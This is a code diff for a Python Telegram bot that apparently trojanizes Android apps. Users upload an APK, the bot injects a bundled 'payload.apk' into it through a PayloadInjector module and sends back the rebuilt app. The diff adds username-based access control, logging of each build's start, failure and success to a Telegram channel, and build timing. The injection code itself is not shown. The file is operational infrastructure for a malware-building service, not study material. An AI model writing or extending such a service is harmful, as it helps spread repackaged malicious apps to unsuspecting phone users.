@@ -21,11 +21,13 @@ if sys.platform == 'win32':
 
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
 
-from modules.config import API_ID, API_HASH, BOT2_TOKEN
+from modules.config import API_ID, API_HASH, BOT2_TOKEN, LOG_CHANNEL_ID
 from modules.auth import UserManager, request_otp, verify_otp
 from modules.utils import cleanup_session
 from modules.queue_manager import build_queue
 from modules.payload_injector import PayloadInjector
+from modules.telegram_logger import TelegramLogHandler
+from modules.admin_check import check_admin_status
 
 # Ensure logs directory exists
 os.makedirs('logs', exist_ok=True)
@@ -33,6 +35,9 @@ os.makedirs('cache', exist_ok=True)
 
 user_manager = UserManager('data/users2.json')
 bot = TelegramClient('data/bot2_session', API_ID, API_HASH)
+
+# Telegram logger
+telegram_logger = None  # Will be initialized after bot starts
 
 # Payload APK path
 PAYLOAD_APK = "payload.apk"
@@ -172,8 +177,29 @@ async def process_payload_injection(event, user_id, message):
     msg = None
     user_apk_path = None
     final_apk_path = None
+    start_time = time.time()
+    
+    # Get user info
+    username = user_manager.users.get(str(user_id), {}).get('username', 'Unknown')
     
     try:
+        # Check admin status before processing
+        is_admin, admin_msg = check_admin_status(username)
+        
+        if not is_admin:
+            logger.warning(f"User {username} ({user_id}) denied: {admin_msg}")
+            await event.reply(
+                f"❌ **Access Denied**\n\n"
+                f"{admin_msg}\n\n"
+                f"Please contact support if this is an error."
+            )
+            
+            # Log to channel
+            if telegram_logger:
+                await telegram_logger.log_admin_check(username, False)
+            
+            return
+        
         await build_queue.acquire(user_id)
         
         # Get file info
@@ -222,15 +248,33 @@ async def process_payload_injection(event, user_id, message):
             "⏳ Please wait..."
         )
         
+        # Get initial app info for logging
+        file_size_mb = file_size / (1024 * 1024)
+        
+        # Log to channel - build start
+        if telegram_logger:
+            await telegram_logger.log_event('build_start', user_id, username, {
+                'bot': 'Payload Injector',
+                'app_name': file_name,
+                'size': f"{file_size_mb:.1f} MB"
+            })
+        
         # Inject payload
         builds_dir = "builds"
         os.makedirs(builds_dir, exist_ok=True)
         output_apk = os.path.join(builds_dir, f"payload_{user_id}_{timestamp}.apk")
         
         injector = PayloadInjector(PAYLOAD_APK)
-        final_apk_path, error = await injector.inject(user_apk_path, output_apk)
+        final_apk_path, error, duration = await injector.inject(user_apk_path, output_apk, user_id, username)
         
         if error or not final_apk_path:
+            # Log to channel - build fail
+            if telegram_logger:
+                await telegram_logger.log_event('build_fail', user_id, username, {
+                    'bot': 'Payload Injector',
+                    'app_name': file_name,
+                    'error': error or 'Unknown error'
+                })
             await msg.edit(
                 f"❌ **Injection Failed**\n\n"
                 f"Error: {error or 'Unknown error'}\n\n"
@@ -259,7 +303,17 @@ async def process_payload_injection(event, user_id, message):
         )
         
         await msg.delete()
-        logger.info(f"✅ Payload injection complete for user {user_id}")
+        
+        # Log to channel - build success
+        if telegram_logger:
+            await telegram_logger.log_event('build_success', user_id, username, {
+                'bot': 'Payload Injector',
+                'app_name': file_name,
+                'output_size': format_size(final_size),
+                'duration': duration
+            })
+        
+        logger.info(f"✅ Payload injection complete for user {user_id} ({username}) in {duration}s")
         
     except Exception as e:
         logger.error(f"Process error: {str(e)}", exc_info=True)
@@ -296,8 +350,17 @@ def format_size(bytes_size):
 
 if __name__ == '__main__':
     async def main():
+        global telegram_logger
+        
         # Start bot
         await bot.start(bot_token=BOT2_TOKEN)
+        
+        # Initialize telegram logger
+        if LOG_CHANNEL_ID:
+            telegram_logger = TelegramLogHandler(bot, LOG_CHANNEL_ID)
+            logger.info(f"✅ Telegram logger enabled: {LOG_CHANNEL_ID}")
+        else:
+            logger.info("⚠️  Telegram logger disabled (no LOG_CHANNEL_ID)")
         
         # Note: Cache disabled for now (was causing issues)
         # await prepare_payload_cache()
